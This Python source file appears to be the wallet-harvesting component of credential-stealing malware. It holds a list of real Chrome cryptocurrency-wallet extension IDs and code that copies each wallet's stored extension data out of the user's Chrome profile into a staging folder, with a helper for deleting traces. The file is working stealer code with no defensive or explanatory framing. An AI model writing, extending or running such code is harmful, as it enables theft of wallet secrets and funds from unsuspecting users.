import os
from pathlib import Path
import shutil

# ---- GLOBAL STATE ----

browser_wallets_count = 0

def log(msg):
    print(msg)

def copy_directory(src, dst):
    shutil.copytree(src, dst, dirs_exist_ok=True)

# ---- REAL EXTENSION IDS ---
chrome_wallets_directories = {
    "Chrome_Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
    "Chrome_Bitapp": "fihkakfobkmkjojpchpfgcmhfjnmnfpi",
    "Chrome_Coin98": "aeachknmefphepccionboohckonoeemg",
    "Chrome_Equal": "blnieiiffboillknjnepogjhkgnoapac",
    "Chrome_Guild": "nanjmdknhkinifnkgdcggcfnhdaammmj",
    "Chrome_Iconex": "flpiciilemghbmfalicajoolhkkenfel",
    "Chrome_Math": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
    "Chrome_Mobox": "fcckkdbjnoikooededlapcalpionmalo",
    "Chrome_Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "Chrome_Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
    "Chrome_XinPay": "bocpokimicclpaiekenaeelehdjllofo",
    "Chrome_Ton": "nphplpgoakhhjchkkhmiggakijnkhfnd",
    "Chrome_Metamask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Chrome_Sollet": "fhmfendgdocmcbmfikdcogofphimnkno",
    "Chrome_Slope": "pocmplpaccanhmnllbbkpgfliimjljgo",
    "Chrome_Starcoin": "mfhbebgoclkghebffdldpobeajmbecfk",
    "Chrome_Swash": "cmndjbecilbocjfkibfbifhngkdmjgog",
    "Chrome_Finnie": "cjmkndjhnagcfbpiemnkdpomccnjblmj",
    "Chrome_Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
    "Chrome_Crocobit": "pnlfjmlcjdjgkddecgincndfgegkecke",
    "Chrome_Oxygen": "fhilaheimglignddkjgofkcbgekhenbh",
    "Chrome_Nifty": "jbdaocneiiinmjbjlgalhcelgbejmnid",
    "Chrome_Liquality": "kpfopkelmapcoipemfendmdcghnegimn"
}

# ---- FUNCTIONS ----

def get_chrome_wallets(profile_output_dir):
    global browser_wallets_count

    if os.name != "nt":
        raise OSError("Windows only")

    wallets_dir = os.path.join(profile_output_dir, "wallets")
    os.makedirs(wallets_dir, exist_ok=True)

    for wallet_name, wallet_id in chrome_wallets_directories.items():
        wallet_dir = (
            Path.home()
            / "AppData" / "Local" / "Google" / "Chrome"
            / "User Data" / "Default"
            / "Local Extension Settings"
            / wallet_id
        )
        copy_wallet(wallets_dir, wallet_dir, wallet_name)

def copy_wallet(wallets_dir, wallet_dir, wallet_name):
    global browser_wallets_count

    if not wallet_dir.exists():
        log(f"Wallet directory for {wallet_name} does not exist.")
        return

    try:
        dst = os.path.join(wallets_dir, wallet_name)
        copy_directory(wallet_dir, dst)
        browser_wallets_count += 1
        log(f"Copied {wallet_name} to {dst}.")
    except Exception as e:
        log(f"Failed to copy {wallet_name}: {e}")

def recursive_delete(path):
    shutil.rmtree(path, ignore_errors=True)
